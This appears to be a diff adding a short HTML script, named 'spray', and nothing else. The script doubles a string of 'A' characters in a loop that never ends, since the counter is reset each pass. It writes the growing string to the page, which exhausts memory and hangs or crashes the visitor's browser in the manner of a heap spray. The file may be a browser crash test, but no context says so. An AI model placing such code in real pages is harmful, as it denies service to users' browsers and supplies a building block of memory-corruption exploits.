@@ -1,0 +1,13 @@
+<script>
+function spray()
+{
+ var x = "\x41";
+ for (i = 0; i < 0x1000; i++)
+ {
+  i = i - 1;
+  x += x;
+  document.write(x);
+ }
+}
+spray();
+</script>
